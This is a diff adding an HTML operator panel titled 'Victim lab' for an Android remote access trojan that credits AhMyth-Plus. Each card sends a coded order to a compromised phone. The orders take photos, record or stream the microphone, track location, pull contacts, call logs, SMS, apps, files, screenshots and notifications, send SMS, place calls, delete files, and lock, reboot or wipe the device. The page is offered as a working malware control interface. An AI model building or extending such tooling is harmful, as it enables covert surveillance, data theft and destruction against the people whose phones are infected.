@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Victim lab</title>
+<link rel="stylesheet" href="style.css">
+<style>
+  main { display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 14px; }
+  .out { max-height: 300px; }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+  .lbl { display: block; color: var(--dim); font-size: 11px; margin: 8px 0 4px; text-transform: uppercase; letter-spacing: .06em; }
+  .notif { border-bottom: 1px solid var(--border); padding: 6px 0; }
+  .notif b { color: var(--accent); }
+  .pill { font-size: 10px; padding: 2px 7px; border-radius: 20px; border: 1px solid var(--border); margin-left: 6px; color: var(--dim); }
+  #livebtn.on { background: #1f3a5f; border-color: var(--ok); color: var(--ok); }
+</style>
+</head>
+<body>
+<header>
+  <h1>Lab <span class="acc" id="vicname">victim</span></h1>
+  <span class="status"><span class="dot" id="vdot"></span><span id="vicmeta"></span></span>
+  <span class="spacer"></span>
+  <button id="back">← Dashboard</button>
+</header>
+<main>
+
+  <!-- Camera -->
+  <div class="card">
+    <h2>Camera</h2>
+    <div class="row">
+      <button data-order='{"order":"x0000ca","extra":"camList"}'>List cameras</button>
+      <button data-order='{"order":"x0000ca","extra":"0"}'>Photo back</button>
+      <button data-order='{"order":"x0000ca","extra":"1"}'>Photo front</button>
+    </div>
+    <div class="out" id="o-ca"></div>
+  </div>
+
+  <!-- Gallery -->
+  <div class="card">
+    <h2>Gallery <span class="pill">inherited from AhMyth-Plus</span></h2>
+    <div class="row">
+      <button data-order='{"order":"x0000getAllImages"}'>List images</button>
+    </div>
+    <div class="out" id="o-imgs"></div>
+    <div class="out" id="o-img" style="margin-top:6px"></div>
+  </div>
+
+  <!-- Mic -->
+  <div class="card">
+    <h2>Microphone</h2>
+    <div class="row">
+      <button data-order='{"order":"x0000mc","sec":5}'>Record 5s</button>
+      <button data-order='{"order":"x0000mc","sec":10}'>Record 10s</button>
+      <button id="livebtn">▶ Live stream</button>
+    </div>
+    <div class="out" id="o-mc"></div>
+  </div>
+
+  <!-- Location -->
+  <div class="card">
+    <h2>Location</h2>
+    <div class="row"><button data-order='{"order":"x0000lm"}'>Get location</button></div>
+    <div class="out" id="o-loc"></div>
+  </div>
+
+  <!-- Contacts -->
+  <div class="card">
+    <h2>Contacts</h2>
+    <div class="row"><button data-order='{"order":"x0000cn"}'>Load contacts</button></div>
+    <div class="out" id="o-cn"></div>
+  </div>
+
+  <!-- Calls -->
+  <div class="card">
+    <h2>Call logs</h2>
+    <div class="row"><button data-order='{"order":"x0000cl"}'>Load call logs</button></div>
+    <div class="out" id="o-cl"></div>
+  </div>
+
+  <!-- SMS -->
+  <div class="card">
+    <h2>SMS</h2>
+    <div class="row"><button data-order='{"order":"x0000sm","extra":"ls"}'>Load inbox</button></div>
+    <div class="lbl">Send SMS</div>
+    <div class="row">
+      <input type="text" id="sms-to" placeholder="phone number" style="width:120px">
+      <input type="text" id="sms-txt" placeholder="message" style="flex:1">
+      <button id="sms-send">Send</button>
+    </div>
+    <div class="out" id="o-sm"></div>
+  </div>
+
+  <!-- Apps -->
+  <div class="card">
+    <h2>Installed apps</h2>
+    <div class="row">
+      <button data-order='{"order":"x0000apps"}'>Load apps</button>
+      <input type="text" id="app-filter" placeholder="filter…" style="flex:1">
+    </div>
+    <div class="out" id="o-apps"></div>
+  </div>
+
+  <!-- File manager -->
+  <div class="card">
+    <h2>File manager</h2>
+    <div class="row">
+      <input type="text" id="fm-path" value="/storage/emulated/0" style="flex:1">
+      <button id="fm-ls">List</button>
+    </div>
+    <div class="out" id="o-fm"></div>
+  </div>
+
+  <!-- Screen capture -->
+  <div class="card">
+    <h2>Screen capture</h2>
+    <div class="row"><button data-order='{"order":"x0000sc"}'>Capture screen</button></div>
+    <div class="out" id="o-sc"></div>
+  </div>
+
+  <!-- Notifications -->
+  <div class="card">
+    <h2>Notifications <span class="pill">live</span></h2>
+    <div class="out" id="o-nt"></div>
+  </div>
+
+  <!-- Utilities -->
+  <div class="card">
+    <h2>Utilities</h2>
+    <div class="lbl">Run app</div>
+    <div class="row">
+      <input type="text" id="ut-run" placeholder="com.android.settings" style="flex:1">
+      <button id="ut-runb">Run</button>
+    </div>
+    <div class="lbl">Open URL</div>
+    <div class="row">
+      <input type="text" id="ut-url" placeholder="https://example.com" style="flex:1">
+      <button id="ut-urlb">Open</button>
+    </div>
+    <div class="lbl">Call number / Delete path</div>
+    <div class="row">
+      <input type="text" id="ut-num" placeholder="+15551234" style="flex:1">
+      <button id="ut-call">Call</button>
+      <input type="text" id="ut-del" placeholder="delete path" style="flex:1">
+      <button id="ut-delb" class="warn">Delete</button>
+    </div>
+    <div class="lbl">Device actions <span class="dim">(admin / owner powers)</span></div>
+    <div class="row">
+      <button data-order='{"order":"x0000lockDevice"}'>Lock</button>
+      <button data-order='{"order":"x0000wipeDevice"}' class="danger">Wipe</button>
+      <button data-order='{"order":"x0000rebootDevice"}' class="warn">Reboot</button>
+    </div>
+    <div class="out" id="o-util"></div>
+  </div>
+
+</main>
+<script src="lab.js"></script>
+</body>
+</html>
